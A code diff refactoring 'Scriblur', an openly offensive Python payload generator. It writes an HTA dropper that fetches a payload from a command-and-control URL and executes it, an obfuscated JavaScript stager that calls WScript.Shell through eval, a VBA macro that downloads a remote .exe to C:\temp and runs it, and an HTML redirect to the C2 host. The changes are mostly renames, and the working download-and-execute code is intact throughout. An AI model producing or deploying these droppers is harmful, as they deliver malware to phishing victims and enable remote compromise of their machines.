@@ -1,16 +1,19 @@
-# Default Imports
-import sys, os, argparse
+#!/usr/bin/env python3
 
-class scriblur:
+# Default Imports
+import os, argparse
+
+
+class Scriblur:
     def __init__(self, name, c2url, c2payload, exeurl):
         self.name = name
         self.c2url = c2url
         self.c2payload = c2payload
         self.exeurl = exeurl
         
-    def hta_generator(self, name, c2url):
-        vHTA = "./Payloads/" + name + ".hta"
-        vPAY = name + ".txt"
+    def generate_hta(self, name, c2url):
+        virtual_hta = "./Payloads/" + name + ".hta"
+        virtual_payload = name + ".txt"
         try:
             hta = "<html>\n"
             hta += "<head>\n"
@@ -40,7 +43,7 @@ class scriblur:
             hta += 'scriblin.Open "GET", "'
             hta += str(c2url)
             hta += "/"
-            hta += str(vPAY)
+            hta += str(virtual_payload)
             hta += '", False'
             hta += "\nscriblin.send\n"
             hta += "scriblurt = scriblin.responsetext\n"
@@ -52,16 +55,15 @@ class scriblur:
             hta += "</body>\n"
             hta += "</html>\n"
 
-            hf = open(vHTA, "w+")
+            hf = open(virtual_hta, "w+")
             hf.write(hta)
             hf.close()
 
         except Exception as e:
-            print('\n[!] Error, Unable to write .HTA Dropper.')
-            print(' Yielded the following error %s' % e)
+           print(f"Error encountered...\nReview the following: {str(e)}")
 
-    def payload_gen(self, name, c2payload):
-        vPAY = "./Payloads/" + name + ".txt"
+    def generate_eval_payload(self, name, c2payload):
+        virtual_payload = "./Payloads/" + name + ".txt"
         try:
             payload = "var a='WSc' +"
             payload += "'ript.Sh' +"
@@ -87,17 +89,16 @@ class scriblur:
             payload += "'"
             payload += ";eval(b);"
 
-            pf = open(vPAY, "w+")
+            pf = open(virtual_payload, "w+")
             pf.write(payload)
             pf.close()
 
         except Exception as e:
-            print('\n[!] Error, Unable to write JS payload.')
-            print(' Yielded the following error %s' % e)
+          print(f"Error encountered...\nReview the following: {str(e)}")
 
-    def macro_gen(self, name, exeurl):
-        vEXE = name + ".exe"
-        vMACRO = "./Payloads/" + name + ".vba"
+    def generate_macro(self, name, exeurl):
+        virtual_executable = name + ".exe"
+        virtual_macro = "./Payloads/" + name + ".vba"
         try:
             macro = "Sub WriteQuiggle()\n"
             macro += "Dim QuiggleFile As Integer\n"
@@ -109,7 +110,6 @@ class scriblur:
             macro += r'Print #QuiggleFile, "HTTPDownload "'
             macro += str(exeurl)
             macro += "/"
-            macro += str(exeurl)
             macro += r'", "C:\temp""'
             macro += '\nPrint #QuiggleFile, "  Sub HTTPDownload( myURL, myPath )"\n'
             macro += 'Print #QuiggleFile, "    Dim i, objFile, objFSO, objHTTP, strFile, strMsg"\n'
@@ -132,23 +132,22 @@ class scriblur:
             macro += 'Print #QuiggleFile, "    WshShell.Run "'
             macro += r"c:\temp"
             macro += chr(92)
-            macro += str(vEXE)
+            macro += str(virtual_executable)
             macro += '""\n'
             macro += 'Print #QuiggleFile, "    End Sub"\n'
             macro += 'Close QuiggleFile\n'
             macro += r'Shell "wscript c:\temp\quiggle.vbs"'
             macro += '\nEnd Sub\n'
 
-            mf = open(vMACRO, "w+")
+            mf = open(virtual_macro, "w+")
             mf.write(macro)
             mf.close()
 
         except Exception as e:
-            print('\n[!] Error, Unable to write VBA Macro.')
-            print(' Yielded the following error %s' % e)
+           print(f"Error encountered...\nReview the following: {str(e)}")
 
-    def redirect_gen(self, name, c2url):
-        vHTML = "./Payloads/" + name + ".html"
+    def generate_redirect(self, name, c2url):
+        virtual_redirect = "./Payloads/" + name + ".html"
         try:
             redirect = "<html>\n"
             redirect += "<head>\n"
@@ -157,7 +156,7 @@ class scriblur:
             redirect += 'content="0;url='
             redirect += str(c2url)
             redirect += "/"
-            redirect += str(vHTML)
+            redirect += str(virtual_redirect)
             redirect += '">\n'
             redirect += "</head>\n"
             redirect += "<body>\n"
@@ -166,53 +165,57 @@ class scriblur:
             redirect += "</body>"
             redirect += "</html>"
 
-            rf = open(vHTML, "w+")
+            rf = open(virtual_redirect, "w+")
             rf.write(redirect)
             rf.close()
 
         except Exception as e:
-            print('\n[!] Error, Unable to write HTML Redirect.')
-            print(' Yielded the following error %s' % e)
+           print(f"Error encountered...\nReview the following: {str(e)}")
     
-    def check_dir(self, name):
+    def validate_directory(self, name):
         try:
-            directory = './Payloads/'
+            directory = "./Payloads/"
 
             if not os.path.isdir(directory):
                 os.makedirs(directory)
             else:
                 pass
         except Exception as e:
-            print("Error encountered... \nReview the following: " + str(e))
+            print(f"Error encountered...\nReview the following: {str(e)}")
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-n', help='HTA payload with redirect', dest='name')
-    parser.add_argument('-p', help='B64 encoded payload', dest='c2payload')
-    parser.add_argument('-c', help='Client domain for whois', dest='c2url')
-    parser.add_argument('-e', help='Malicious link hosting .exe', dest='exeurl')
+    parser.add_argument("-n", help="HTA payload with redirect", dest="name")
+    parser.add_argument("-p", help="B64 encoded payload", dest="c2payload")
+    parser.add_argument("-c", help="Client domain for whois", dest="c2url")
+    parser.add_argument("-e", help="Malicious link hosting .exe", dest="exeurl")
 
     args = parser.parse_args()
 
-    Scriblur = scriblur(args.name, args.c2url, args.c2payload, args.exeurl)
-    Scriblur.check_dir(args.name)
+    InitScriblur = Scriblur(args.name, args.c2url, args.c2payload, args.exeurl)
+    InitScriblur.validate_directory(args.name)
     print("\n----------[Scriblur]----------")
     if not args.exeurl:
-        Scriblur.hta_generator(args.name, args.c2url)
+        InitScriblur.generate_hta(args.name, args.c2url)
         print("\n[*] Successfully generated .hta! ")
 
-        Scriblur.redirect_gen(args.name, args.c2url)
+        InitScriblur.generate_redirect(args.name, args.c2url)
         print("\n[*] Successfully generated .html redirect! ")
         
-        Scriblur.payload_gen(args.name, args.c2payload)
+        InitScriblur.generate_eval_payload(args.name, args.c2payload)
         print("\n[*] Successfully generated obfuscated payload file.")
 
     else:
-        Scriblur.macro_gen(args.name, args.exeurl)
+        InitScriblur.generate_macro(args.name, args.exeurl)
         print("\n[*] Successfully generated macro payload! ")
-if __name__ == '__main__':
+
+if __name__ == "__main__":
+
+
     try:
         main()
     except KeyboardInterrupt:
-        print('\n \033[1;31m[!] Ctrl + C Detected, Quitting...')
-exit(0)
+        print("\n \033[1;31m[!] Ctrl + C Detected, Quitting...")
+    exit(0)
+
+    
